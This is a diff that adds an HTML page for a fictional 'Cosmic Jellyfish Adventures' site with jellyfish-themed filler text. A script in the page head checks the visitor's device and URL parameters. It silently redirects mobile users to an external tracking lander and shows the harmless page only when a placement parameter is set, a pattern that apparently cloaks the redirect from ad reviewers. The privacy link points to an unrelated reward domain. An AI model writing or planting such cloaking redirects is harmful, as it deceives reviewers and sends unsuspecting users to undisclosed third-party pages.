@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/dade2563-43ce-4351-9ba3-22961c539221?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Jellyfish Adventures</title>
+    <style>
+        body {
+            font-family: 'Comic Sans MS', cursive;
+            background: linear-gradient(45deg, #FF00FF, #00FFFF);
+            margin: 0;
+            padding: 0;
+            color: #FFFFFF;
+        }
+        header {
+            background-color: #800080;
+            padding: 20px;
+            text-align: center;
+        }
+        main {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-around;
+            padding: 20px;
+        }
+        section {
+            background-color: rgba(255, 255, 255, 0.2);
+            border-radius: 15px;
+            padding: 20px;
+            margin: 10px;
+            width: 30%;
+            min-width: 250px;
+        }
+        footer {
+            background-color: #4B0082;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+        a {
+            color: #FFFF00;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Cosmic Jellyfish Adventures</h1>
+    </header>
+    <main>
+        <section>
+            <h2>Neon Tentacle Tours</h2>
+            <p>Experience the thrill of riding on bioluminescent jellyfish through the cosmos!</p>
+        </section>
+        <section>
+            <h2>Gelatinous Gastronomy</h2>
+            <p>Taste our out-of-this-world jellyfish-inspired cuisine that will make your taste buds tingle!</p>
+        </section>
+        <section>
+            <h2>Pulsating Light Shows</h2>
+            <p>Witness spectacular light displays choreographed by our talented jellyfish performers!</p>
+        </section>
+    </main>
+    <footer>
+        <a href="https://tokreward.com/privacy.html">Privacy Policy</a>
+    </footer>
+</body>
+</html>
